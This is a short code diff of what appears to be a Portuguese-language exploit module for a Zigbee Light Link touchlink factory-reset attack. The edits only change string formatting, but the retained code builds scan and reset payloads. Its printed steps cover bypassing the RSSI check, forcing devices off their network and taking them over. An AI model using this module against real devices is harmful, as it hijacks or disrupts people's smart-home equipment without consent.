@@ -109,7 +109,7 @@ class Exploit(Exploit):
             print_warning("interface não definida — execute em modo demonstração")
 
         channels = _TOUCHLINK_CHANNELS if self.scan_all_channels else [int(self.channel)]
-        print_status("Canais a varrer: {}".format(channels))
+        print_status(f"Canais a varrer: {channels}")
 
         inter_pan_id = struct.unpack("<I", os.urandom(4))[0]
         scan_payload, used_id = _build_touchlink_scan_request(inter_pan_id)
@@ -128,18 +128,17 @@ class Exploit(Exploit):
 
         print_status("Construindo Reset to Factory New (cmd 0x07)...")
         reset_payload = _build_factory_reset_command(used_id)
-        print_info("Reset payload: {}".format(reset_payload.hex()))
-        print_info("Repetições: {} | Delay: {}s".format(self.reset_count, self.reset_delay))
+        print_info(f"Reset payload: {reset_payload.hex()}")
+        print_info(f"Repetições: {self.reset_count} | Delay: {self.reset_delay}s")
 
         print_info("")
         print_info("Fluxo de ataque:")
         print_info("  1. Configurar dongle {} em modo Inter-PAN".format(
             self.interface or "CC2531/nRF52840"))
-        print_info("  2. Enviar ZLL Scan Request em broadcast nos canais: {}".format(channels))
+        print_info(f"  2. Enviar ZLL Scan Request em broadcast nos canais: {channels}")
         print_info("  3. Dispositivos ZLL respondem com Scan Response (RSSI check)")
         print_info("  4. Bypass do RSSI threshold (enviar sinal forte ou spoof threshold)")
-        print_info("  5. Enviar {} x Reset to Factory New para cada dispositivo".format(
-            self.reset_count))
+        print_info(f"  5. Enviar {self.reset_count} x Reset to Factory New para cada dispositivo")
         print_info("  6. Dispositivo se desvincula da rede Zigbee existente")
         print_info("  7. Atacante pode adicionar dispositivo à própria rede Zigbee")
 
